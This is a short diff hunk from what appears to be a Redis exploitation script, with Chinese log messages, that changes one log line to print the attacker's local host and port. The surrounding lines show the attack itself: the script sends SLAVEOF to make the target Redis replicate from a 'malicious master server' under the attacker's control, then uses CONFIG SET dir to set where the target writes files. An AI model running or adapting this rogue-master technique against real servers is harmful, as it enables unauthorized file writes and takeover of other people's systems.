@@ -149,7 +149,7 @@ def runserver(rhost, rport, lhost, lport,rpath,rfile):
             if "NOAUTH" in infos:
                 info("Redis 需要密码认证")
                 exit()
-        info("连接恶意主服务器: %s:%s " % (rhost,rport))
+        info("连接恶意主服务器: %s:%s " % (lhost,lport))
         info("连接恶意主状态: %s " % (remote.do(f"SLAVEOF##{lhost}##{lport}")))
         info("设置写出路径为: %s " % (str(rpath)))
         info("设置写出路径状态: %s " % (remote.do(f"CONFIG##SET##dir##{str(rpath)}")))
